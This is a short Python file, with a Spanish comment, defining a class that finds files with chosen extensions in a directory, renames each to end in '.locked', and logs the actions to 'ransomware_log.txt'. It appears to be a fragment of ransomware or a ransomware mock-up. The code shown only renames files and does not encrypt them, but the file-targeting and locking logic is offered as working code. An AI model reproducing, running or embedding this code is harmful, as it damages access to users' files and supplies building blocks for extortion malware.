import os

class FileManager:
    def __init__(self, destination, extensions):
        self.destination = destination
        self.extensions = extensions
        self.files = self.discover_files()

    def discover_files(self):
        # Lista los archivos en el directorio de destino con las extensiones objetivo
        files = os.listdir(self.destination)
        files = [f for f in files if not f.startswith('.') and any(f.endswith(ext) for ext in self.extensions)]
        return files

    def rename_files(self):
        for file in self.files:
            base = os.path.splitext(file)[0]
            new_name = base + ".locked"
            os.rename(os.path.join(self.destination, file), os.path.join(self.destination, new_name))

    def log_activity(self, action, file):
        with open("ransomware_log.txt", 'a') as log_file:
            log_file.write(f"{action}: {file}\n")
